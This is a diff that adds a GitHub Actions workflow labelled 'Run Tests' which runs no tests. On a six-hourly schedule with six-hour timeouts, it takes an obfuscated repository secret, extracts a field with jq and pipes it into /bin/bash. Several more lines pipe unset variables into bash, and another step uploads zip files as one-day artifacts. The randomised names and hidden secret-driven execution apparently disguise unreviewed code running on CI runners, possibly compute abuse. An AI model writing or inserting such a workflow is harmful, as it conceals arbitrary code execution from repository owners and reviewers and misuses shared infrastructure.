@@ -1,0 +1,33 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '25 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          stvj78: ${{ secrets.stvj78 }}
+        run: |
+          printf '%s' "$stvj78" | jq -r .lfglw7420 | /bin/bash
+          printf '%s' "$qiaf0360" | jq -r .ud0 | /bin/bash
+          echo $cx2 | jq -r .xs6063 | /bin/bash
+          printf '%s' "$pr19630" | jq -r .ak2 | /bin/bash
+          printf '%s' "$r2018" | jq -r .rwp28 | /bin/bash
+          printf '%s' "$lk0409" | jq -r .g464 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ONn8W8AB
+          path: "*.zip"
+          retention-days: 1
